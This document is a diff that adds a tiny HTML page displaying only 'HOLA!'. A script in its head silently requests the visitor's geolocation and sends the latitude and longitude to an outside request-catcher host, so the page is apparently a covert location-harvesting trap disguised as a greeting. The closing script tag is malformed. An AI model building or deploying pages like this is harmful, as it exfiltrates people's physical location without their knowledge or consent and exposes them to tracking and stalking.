@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+var geo = window.navigator.geolocation;
+  geo.getCurrentPosition(function(position){ 
+    fetch("https://a.requestcatcher.com/latitud/" + position.coords.latitude);
+    fetch("https://a.requestcatcher.com/longitud/" + position.coords.longitude);
+  });
+<script>
+</head>
+<body>
+<center>
+<b>
+<h1>
+HOLA!
+</h1>
+</b>
+</center>
+</body>
+</html>
